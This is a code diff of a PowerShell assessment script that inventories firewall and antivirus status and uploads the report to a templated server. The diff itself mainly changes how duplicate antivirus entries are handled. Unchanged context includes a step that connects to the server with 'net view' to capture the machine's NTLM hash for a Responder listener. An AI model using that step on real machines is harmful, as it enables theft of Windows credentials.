@@ -168,7 +168,15 @@ Write-Host "Collecting info about windows firewall."
 $firewallStatus = Get-NetFireWallProfile | Select Profile, Enabled, DefaultInboundAction,DefaultOutboundAction,AllowInboundRules, AllowLocalFirewallRules, AllowLocalIPsecRules, AllowUserApps, AllowUserPorts, DisabledInterfaceAliases
 #https://jdhitsolutions.com/blog/powershell/5187/get-antivirus-product-status-with-powershell/
 Write-Host "Collecting info about antivirus."
-$avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select displayName, productState, timestamp 
+# Pull every registered AV product (Defender, ESET, Bitdefender, Norton,
+# Kaspersky, McAfee, Sophos, CrowdStrike, ...). Keep ALL entries -- some
+# machines have stale registrations from uninstalled products that share a
+# displayName with the current one, and we still want to see them in the
+# report. We retain extra identifying fields (instanceGuid + the signed
+# exe paths) so duplicates can be told apart by something stable rather
+# than just product name.
+$avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
+    Select-Object displayName, instanceGuid, pathToSignedProductExe, pathToSignedReportingExe, productState, timestamp
 $responder = CollectNTLM
 
 
@@ -199,10 +207,47 @@ $collectedData | Add-Member -MemberType NoteProperty -Name Firewall -Value $fire
 $collectedData | Add-Member -MemberType NoteProperty -Name Antivirus -Value $avProducts
 $collectedData | Add-Member -MemberType NoteProperty -Name Responder -Value $responder
 
+# Add a per-product NoteProperty for each registered AV. SecurityCenter2
+# can return more than one entry with the same displayName (stale
+# registrations from a reinstalled product, or two SKUs of the same
+# vendor). Using displayName alone as the property name throws
+# "member with this name already exists" on the second one, so we build
+# a composite key from the most identifying fields available, and skip
+# only when the *exact same* composite shows up twice.
+$seenAvKeys = @{}
 foreach ($avProduct in $avProducts)
 {
   $avStatus = Get-AV-Status $avProduct.productState $avProduct.displayName
-  $collectedData | Add-Member -MemberType NoteProperty -Name $avProduct.displayName -Value $avStatus
+  $keyParts = @(
+    $avProduct.displayName,
+    $avProduct.instanceGuid,
+    $avProduct.pathToSignedProductExe,
+    $avProduct.pathToSignedReportingExe,
+    $avProduct.productState
+  ) | ForEach-Object { if ($_) { $_.ToString() } else { '' } }
+  $compositeKey = ($keyParts -join '|')
+  if ($seenAvKeys.ContainsKey($compositeKey)) { continue }
+  $seenAvKeys[$compositeKey] = $true
+
+  # Property name: prefer displayName + a short disambiguator if we already
+  # have one with that displayName. Falls back to the full composite key
+  # if displayName is missing.
+  $propName = if ($avProduct.displayName) { [string]$avProduct.displayName } else { 'AntivirusProduct' }
+  $existing = $collectedData.PSObject.Properties[$propName]
+  if ($existing) {
+    $disambiguator = $avProduct.instanceGuid
+    if (-not $disambiguator) { $disambiguator = $avProduct.pathToSignedProductExe }
+    if (-not $disambiguator) { $disambiguator = [string]$avProduct.productState }
+    if (-not $disambiguator) { $disambiguator = [guid]::NewGuid().ToString() }
+    $propName = "$propName ($disambiguator)"
+    # In the unlikely event even that collides, append an index suffix.
+    $i = 2
+    while ($collectedData.PSObject.Properties[$propName]) {
+      $propName = "$($avProduct.displayName) ($disambiguator) #$i"
+      $i++
+    }
+  }
+  $collectedData | Add-Member -MemberType NoteProperty -Name $propName -Value $avStatus
 }
 
 $collectedData | Add-Member -MemberType NoteProperty -Name IP_config -Value $ipConfig
@@ -234,10 +279,7 @@ if ($choice -eq "1" -or $choice -eq "2") {
 # --- Upload to server ---
 if ($choice -ne "1") {
     try {
-        $serverIP = $resolved
-        if (-not $serverIP) {
-            $serverIP = (Resolve-DnsName -Name "mytt" -ErrorAction Stop | Where-Object { $_.Type -eq "A" } | Select-Object -ExpandProperty IPAddress -First 1)
-        }
+        $serverIP = "{{SERVER_IP}}"
         if ($serverIP) {
             $uploadUrl = "https://$serverIP/upload"
             Write-Host "Uploading $fileName to $uploadUrl ..."
@@ -479,24 +521,12 @@ return "Not joined."
 }
 
 function CollectNTLM {
-    Write-Host "Resolving mytt to IP..."
-
-    # Try DNS resolution first
-    try {
-        $resolved = Resolve-DnsName -Name "mytt" -ErrorAction Stop |
-                    Where-Object { $_.Type -eq "A" } |
-                    Select-Object -ExpandProperty IPAddress -First 1
-    }
-    catch {
-        Write-Host "DNS resolution failed, trying ping fallback..."
-        $resolved = (Test-Connection -ComputerName "TT" -Count 1 -ErrorAction SilentlyContinue).IPv4Address.IPAddressToString
-    }
+    $resolved = "{{SERVER_IP}}"
 
     if (-not $resolved) {
-        return "Unable to resolve mytt to an IP address."
+        return "Server IP not configured."
     }
 
-    Write-Host "mytt resolved to $resolved"
     Write-Host "Collecting NTLM hash by connecting to \\$resolved..."
 
     $output = net view "\\$resolved" 2>&1
